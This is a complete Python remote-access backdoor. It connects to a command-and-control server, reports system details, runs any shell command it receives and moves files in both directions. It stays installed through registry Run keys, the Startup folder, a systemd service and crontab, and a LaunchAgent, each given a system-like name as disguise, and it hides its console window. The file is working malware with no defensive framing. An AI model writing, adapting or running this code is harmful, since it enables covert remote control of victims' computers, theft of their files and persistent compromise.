import socket
import subprocess
import os
import sys
import time
import platform
import random
import threading
import shutil
from datetime import datetime


class Backdoor:
    def __init__(self, host="127.0.0.1", port=4444):
        self.host = host
        self.port = port
        self.socket = None
        self.connected = False
        self.system_info = self._get_system_info()
        
    def _get_system_info(self):
        """Gather system information"""
        uname = platform.uname()
        user = os.getlogin()
        current_dir = os.getcwd()
        return f"""
System: {uname.system} {uname.release}
Node: {uname.node}
User: {user}
Path: {current_dir}
Python: {sys.version.split()[0]}
Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
"""

    def connect(self):
        """Establish connection to the C2 server"""
        while not self.connected:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.host, self.port))
                self.socket.send(self.system_info.encode())
                self.connected = True
                print("[+] Connection established")
                self.receive_commands()
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                time.sleep(random.randint(5, 15))  # Random retry interval
    
    def receive_commands(self):
        """Receive and execute commands from the server"""
        while self.connected:
            try:
                command = self.socket.recv(4096).decode().strip()
                
                if not command:
                    continue
                    
                if command.lower() == "exit":
                    self.disconnect()
                    break
                    
                if command.lower() == "sysinfo":
                    response = self.system_info
                elif command.startswith("cd "):
                    path = command[3:]
                    try:
                        os.chdir(path)
                        response = f"Changed directory to {os.getcwd()}"
                    except Exception as e:
                        response = f"Error changing directory: {str(e)}"
                elif command.startswith("download "):
                    file_path = command[9:]
                    response = self._send_file(file_path)
                elif command.startswith("upload "):
                    response = self._receive_file(command[7:])
                elif command == "persist":
                    response = self._setup_persistence()
                else:
                    # Execute shell command
                    response = self._execute_command(command)
                
                self.socket.send(response.encode())
                
            except Exception as e:
                print(f"[-] Error: {e}")
                self.connected = False
                break
        
        if not self.connected:
            self.connect()  # Try to reconnect
    
    def _execute_command(self, command):
        """Execute a system command and return the output"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=15)
            output = result.stdout
            if result.stderr:
                output += "\n" + result.stderr
            return output if output else "Command executed (no output)"
        except subprocess.TimeoutExpired:
            return "Command timed out after 15 seconds"
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def _send_file(self, file_path):
        """Send file to the server"""
        try:
            if not os.path.exists(file_path):
                return f"Error: File {file_path} not found"
            
            with open(file_path, "rb") as f:
                file_data = f.read()
            
            file_size = len(file_data)
            file_info = f"FILE:{os.path.basename(file_path)}:{file_size}"
            self.socket.send(file_info.encode())
            
            # Wait for server to be ready
            self.socket.recv(1024)
            
            # Send file data
            self.socket.sendall(file_data)
            return f"File {file_path} sent successfully"
        except Exception as e:
            return f"Error sending file: {str(e)}"
    
    def _receive_file(self, file_path):
        """Receive file from the server"""
        try:
            self.socket.send("READY".encode())
            
            # Receive file size
            file_size = int(self.socket.recv(1024).decode())
            
            # Send acknowledgment
            self.socket.send("SIZE_RECEIVED".encode())
            
            # Receive file data
            file_data = b""
            while len(file_data) < file_size:
                packet = self.socket.recv(4096)
                if not packet:
                    break
                file_data += packet
            
            with open(file_path, "wb") as f:
                f.write(file_data)
            
            return f"File saved to {file_path}"
        except Exception as e:
            return f"Error receiving file: {str(e)}"
    
    def _setup_persistence(self):
        """Setup persistence based on the operating system"""
        system = platform.system().lower()
        
        try:
            if system == "windows":
                # Copy to startup folder
                startup_path = os.path.join(os.getenv("APPDATA"), 
                                         "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
                executable_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
                target_path = os.path.join(startup_path, "system_service.pyw")
                
                shutil.copy2(executable_path, target_path)
                
                # Add to registry
                os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemService /t REG_SZ /d "{target_path}" /f')
                
                return "Persistence established via startup folder and registry"
                
            elif system == "linux":
                # Create a systemd service
                executable_path = os.path.abspath(sys.argv[0])
                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User={os.getlogin()}
ExecStart=/usr/bin/python3 {executable_path}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
                service_path = os.path.expanduser("~/.config/systemd/user/update-service.service")
                os.makedirs(os.path.dirname(service_path), exist_ok=True)
                
                with open(service_path, "w") as f:
                    f.write(service_content)
                
                os.system("systemctl --user enable update-service")
                os.system("systemctl --user start update-service")
                
                # Also add to crontab
                os.system(f"(crontab -l 2>/dev/null; echo '@reboot python3 {executable_path}') | crontab -")
                
                return "Persistence established via systemd service and crontab"
                
            elif system == "darwin":  # macOS
                plist_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.system.plist")
                executable_path = os.path.abspath(sys.argv[0])
                
                plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.system</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{executable_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>"""
                
                with open(plist_path, "w") as f:
                    f.write(plist_content)
                
                os.system(f"launchctl load {plist_path}")
                
                return "Persistence established via Launch Agent"
            
            else:
                return f"Persistence not implemented for {system}"
                
        except Exception as e:
            return f"Failed to establish persistence: {str(e)}"
    
    def disconnect(self):
        """Disconnect from the server"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        self.connected = False
        print("[-] Disconnected")


if __name__ == "__main__":
    # For stealth, hide console window on Windows
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    # Create and start backdoor (replace with actual C2 server IP)
    backdoor = Backdoor(host="127.0.0.1", port=4444)
    
    # Start the connection in a separate thread
    connection_thread = threading.Thread(target=backdoor.connect)
    connection_thread.daemon = True
    connection_thread.start()
    
    # Main thread enters an infinite loop to keep the program running
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        backdoor.disconnect()
        sys.exit(0) 